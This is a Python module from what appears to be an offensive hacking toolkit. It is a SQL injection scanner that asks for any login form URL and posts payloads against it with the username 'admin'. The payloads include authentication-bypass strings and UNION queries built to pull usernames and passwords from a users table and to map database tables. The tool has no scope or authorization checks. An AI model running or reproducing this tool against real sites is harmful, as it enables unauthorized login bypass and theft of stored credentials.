import requests
import random
import string
from ..shared_utils import Color

def generate_random_string(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_sql_payloads(num_payloads=10, payload_type='scan'):
    scan_templates = [
        f"' OR '{generate_random_string()}'='{generate_random_string()}'",
        f'" OR "{generate_random_string()}"="{generate_random_string()}"',
        "' OR 1=1 --",
        "' OR '1'='1' --",
        "' OR 1=1 LIMIT 1 --",
        "' OR 1=1#",
        "' OR 'x'='x",
        "1' OR '1'='1",
        "1' OR '1'='1'--",
    ]

    injection_templates = [
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT NULL,NULL,NULL --",
        "' UNION SELECT username, password FROM users --",
        "1' UNION SELECT 1, @@VERSION --",
        "1' UNION SELECT 1, table_name FROM information_schema.tables --"
    ]

    templates = scan_templates if payload_type == 'scan' else injection_templates
    return random.choices(templates, k=num_payloads)

def sql_injection_scanner_tool():
    print(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} SQL Injection Scanner")

    url = input(f"{Color.DARK_GRAY}  - {Color.WHITE}Enter the full URL of the login form: {Color.RESET}").strip()
    if not url:
        print(f"{Color.DARK_GRAY}[{Color.RED}✖{Color.DARK_GRAY}]{Color.RED} URL cannot be empty.")
        return

    username_field = input(f"{Color.DARK_GRAY}  - {Color.WHITE}Enter the form field name for username/email: {Color.RESET}").strip()
    password_field = input(f"{Color.DARK_GRAY}  - {Color.WHITE}Enter the form field name for password: {Color.RESET}").strip()

    if not username_field or not password_field:
        print(f"{Color.DARK_GRAY}[{Color.RED}✖{Color.DARK_GRAY}]{Color.RED} Form field names cannot be empty.")
        return

    payload_type = input(f"{Color.DARK_GRAY}  - {Color.WHITE}Enter payload type (scan/injection) [scan]: {Color.RESET}").strip().lower() or 'scan'

    try:
        num_payloads = int(input(f"{Color.DARK_GRAY}  - {Color.WHITE}Number of payloads to test [10]: {Color.RESET}").strip() or 10)
    except ValueError:
        print(f"{Color.DARK_GRAY}[{Color.RED}✖{Color.DARK_GRAY}]{Color.RED} Invalid number. Using default of 10.")
        num_payloads = 10

    error_keywords = [
        "sql", "syntax", "mysql", "unclosed", "database", "query", "warning", "fatal", "error"
    ]

    payloads = generate_sql_payloads(num_payloads, payload_type)
    print(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Starting scan on {url}...")

    vulnerable = False
    for payload in payloads:
        data = {
            username_field: 'admin',
            password_field: payload
        }
        try:
            response = requests.post(url, data=data, timeout=10)
            if any(keyword in response.text.lower() for keyword in error_keywords):
                print(f"{Color.DARK_GRAY}[{Color.LIGHT_GREEN}✔{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Potential vulnerability found!")
                print(f"  Payload: {Color.WHITE}{payload}")
                print(f"  Reason: Detected error keyword in response.")
                vulnerable = True
            else:
                print(f"{Color.DARK_GRAY}[{Color.RED}✖{Color.DARK_GRAY}]{Color.GRAY} Not vulnerable with payload: {payload}")

        except requests.exceptions.RequestException as e:
            print(f"{Color.DARK_GRAY}[{Color.RED}✖{Color.DARK_GRAY}]{Color.RED} Connection error for payload '{payload}': {e}")

    if vulnerable:
        print(f"\n{Color.DARK_GRAY}[{Color.LIGHT_GREEN}✔{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Scan complete. The target appears to be vulnerable to SQL injection.")
    else:
        print(f"\n{Color.DARK_GRAY}[{Color.RED}✖{Color.DARK_GRAY}]{Color.RED} Scan complete. No obvious vulnerabilities found with these payloads.")
